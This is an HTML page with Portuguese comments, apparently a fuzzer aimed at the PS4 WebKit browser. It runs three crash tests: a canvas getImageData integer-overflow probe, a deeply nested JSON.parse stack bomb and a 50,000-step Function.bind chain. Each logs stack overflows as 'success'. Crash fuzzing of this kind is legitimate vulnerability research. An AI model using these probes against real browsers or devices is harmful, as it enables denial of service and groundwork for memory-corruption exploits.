<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Math & Recursion Fuzzer</title>
    <style>
        body { background-color: #000; color: #ffff00; font-family: monospace; padding: 20px; }
        button { 
            background: #222200; color: #ffff00; border: 2px solid #ffff00; 
            padding: 15px; width: 100%; margin-bottom: 10px; 
            font-size: 18px; font-weight: bold; cursor: pointer;
        }
        button:hover { background: #444400; }
        #log { border: 1px solid #ffff00; padding: 10px; height: 250px; overflow-y: scroll; white-space: pre-wrap; }
        canvas { display: none; }
    </style>
</head>
<body>

    <h1>MATH & RECURSION ATTACKS</h1>
    <p>Target: Integer Overflow (Canvas), Stack Exhaustion (JSON/Bind)</p>

    <button onclick="runCanvasOverflow()">TEST 1: Canvas GetImageData Integer Overflow</button>
    <button onclick="runJSONBomb()">TEST 2: JSON.parse Depth Bomb</button>
    <button onclick="runBindChain()">TEST 3: Function.bind() Chain Reaction</button>

    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>

    <script>
        function log(msg) { 
            document.getElementById('log').innerText = `> ${msg}\n` + document.getElementById('log').innerText;
        }

        // --- TESTE 1: Canvas GetImageData Integer Overflow ---
        // Tenta enganar o cálculo de tamanho do buffer de pixels.
        // Alvo: (w * h * 4) causando overflow em 32-bit.
        function runCanvasOverflow() {
            log("Iniciando Canvas Integer Overflow Check...");
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            
            // Dimensões que, multiplicadas por 4, excedem 2^32 (4GB)
            // 32768 * 32768 * 4 = 4,294,967,296 (0 em 32-bit)
            // Tentamos um valor "seguro" para alocação 2D, mas fatal para o buffer linear
            const hugeSide = 65536; 
            
            try {
                log(`Solicitando buffer de imagem: ${hugeSide}x10...`);
                // Isso deveria falhar com "Out of Memory" ou "InvalidStateError"
                // Se crashar, o cálculo de tamanho "deu a volta" e tentou ler memória inválida.
                const data = ctx.getImageData(0, 0, hugeSide, 10);
                log("Buffer alocado (Inesperado, tamanho: " + data.data.length + ")");
                
                log("Tentando overflow massivo (Pode travar)...");
                // Tenta provocar o overflow aritmético exato
                const overflowData = ctx.getImageData(0, 0, 32768, 32768); 
                log("Sobreviveu ao Overflow.");
                
            } catch(e) {
                log("Erro Canvas (Protegido): " + e.message);
            }
        }

        // --- TESTE 2: JSON.parse Depth Bomb ---
        // O parser JSON usa recursão C++. O limite de pilha do PS4 é baixo.
        // Criamos uma string JSON válida, mas absurdamente profunda.
        function runJSONBomb() {
            log("Gerando JSON Depth Bomb...");
            
            setTimeout(() => {
                try {
                    const depth = 5000; // Profundidade alta
                    log(`Construindo JSON com profundidade ${depth}...`);
                    
                    // Cria '[[[[...]]]]'
                    const jsonString = "[".repeat(depth) + "1" + "]".repeat(depth);
                    
                    log("Parseando (Isso deve estourar a Stack C++)...");
                    const obj = JSON.parse(jsonString);
                    
                    log("JSON parseado com sucesso (Stack robusta).");
                } catch(e) {
                    log("Erro JSON: " + e.message);
                    if (e.message.toLowerCase().includes("stack")) {
                        log("SUCESSO: Stack Overflow detectado no JSON Parser!");
                    }
                }
            }, 100);
        }

        // --- TESTE 3: Function.bind() Chain Reaction ---
        // Cria uma cadeia de funções ligadas (bound functions).
        // A execução força o motor a desempilhar contextos infinitamente.
        function runBindChain() {
            log("Criando cadeia Function.bind()...");
            
            try {
                let func = function() { return "pow"; };
                
                // Encadeia .bind() 50.000 vezes
                // Isso cria 50.000 objetos na memória ligados entre si
                for (let i = 0; i < 50000; i++) {
                    func = func.bind(null);
                }
                
                log("Cadeia criada. Executando (Trigger)...");
                
                // O gatilho: Chamar a função final
                // O WebKit tem que resolver a cadeia inteira de uma vez
                func();
                
                log("Bind Chain executada (Sem crash).");
                
            } catch(e) {
                log("Erro Bind: " + e.message);
                if (e.message.includes("stack")) {
                    log("SUCESSO: Stack Overflow via Bind Chain!");
                }
            }
        }

    </script>
</body>
</html>
